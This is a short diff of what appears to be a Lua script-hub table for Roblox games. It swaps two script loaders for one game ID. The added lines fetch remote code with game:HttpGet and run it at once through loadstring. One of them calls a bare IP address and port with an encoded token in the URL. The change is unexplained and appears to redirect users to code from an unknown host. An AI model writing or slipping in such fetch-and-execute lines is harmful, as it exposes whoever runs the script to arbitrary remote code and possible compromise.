@@ -11,8 +11,8 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/hea
     ]],
 
     [920587237] = [[
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Sporty333/SpawnerX-Hub/main/Loader.lua"))()
-loadstring(game:HttpGet("https://pastefy.app/DEQ6FGR0/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testm"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjY3MTBjOTYyLTcxOTItNDcxYi04ZjQyLWNmOWExYThjNGFiNSIsImtpbmQiOiJtZWRpYSIsInZpc3VhbCI6eyJpZCI6InVuaXZlcnNhbCJ9fQ"))()
     ]],
 
     [126884695634066] = [[
